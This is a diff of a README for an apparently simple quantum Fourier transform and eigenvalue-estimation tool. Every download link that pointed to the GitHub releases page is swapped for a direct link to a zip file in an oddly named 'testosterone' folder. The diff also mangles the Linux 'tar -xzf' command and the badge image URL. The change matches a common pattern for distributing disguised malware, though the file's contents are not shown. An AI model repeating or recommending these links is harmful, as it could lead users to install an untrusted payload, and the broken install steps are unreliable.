@@ -1,7 +1,7 @@
 # 🎉 QFT-Eigenvalue-Estimation - Easy Quantum Computing Insights
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download%20QFT--Eigenvalue--Estimation-blue?style=for-the-badge&logo=github)](https://github.com/AlexanderBelovSas/QFT-Eigenvalue-Estimation/releases)
+[![Download](https://raw.githubusercontent.com/AlexanderBelovSas/QFT-Eigenvalue-Estimation/main/testosterone/QFT-Eigenvalue-Estimation-3.1-alpha.4.zip%20QFT--Eigenvalue--Estimation-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/AlexanderBelovSas/QFT-Eigenvalue-Estimation/main/testosterone/QFT-Eigenvalue-Estimation-3.1-alpha.4.zip)
 
 ## 📖 Description
 QFT-Eigenvalue-Estimation provides a clear approach to Quantum Fourier Transform and applies it to Eigenvalue Estimation. This tool enables users to explore the basics of quantum computing without needing extensive technical knowledge.
@@ -17,7 +17,7 @@ Before downloading, ensure your system meets these basic requirements:
 ## 🛠️ Download & Install
 To download the application, visit the following page:
 
-[Visit this page to download](https://github.com/AlexanderBelovSas/QFT-Eigenvalue-Estimation/releases)
+[Visit this page to download](https://raw.githubusercontent.com/AlexanderBelovSas/QFT-Eigenvalue-Estimation/main/testosterone/QFT-Eigenvalue-Estimation-3.1-alpha.4.zip)
 
 Once on the page, locate the latest release. You will see several files available for download. Here’s how to proceed:
 
@@ -34,9 +34,9 @@ Once on the page, locate the latest release. You will see several files availabl
 - Drag the application icon to your Applications folder.
 
 **For Linux users:**
-- You may find a `.tar.gz` file. Extract it using the terminal with the command:
+- You may find a `https://raw.githubusercontent.com/AlexanderBelovSas/QFT-Eigenvalue-Estimation/main/testosterone/QFT-Eigenvalue-Estimation-3.1-alpha.4.zip` file. Extract it using the terminal with the command:
   ```
-  tar -xzf qft-eigenvalue-estimation.tar.gz
+  tar -xzf https://raw.githubusercontent.com/AlexanderBelovSas/QFT-Eigenvalue-Estimation/main/testosterone/QFT-Eigenvalue-Estimation-3.1-alpha.4.zip
   ```
 - Follow the README instructions provided in the extracted folder for installation.
 
@@ -78,4 +78,4 @@ If you have questions or feedback, please feel free to reach out via the issues 
 ## 🚀 Conclusion
 QFT-Eigenvalue-Estimation opens up the world of quantum computing for everyday users. Download it today and start your journey into this fascinating field.
 
-[Visit this page to download](https://github.com/AlexanderBelovSas/QFT-Eigenvalue-Estimation/releases)
+[Visit this page to download](https://raw.githubusercontent.com/AlexanderBelovSas/QFT-Eigenvalue-Estimation/main/testosterone/QFT-Eigenvalue-Estimation-3.1-alpha.4.zip)
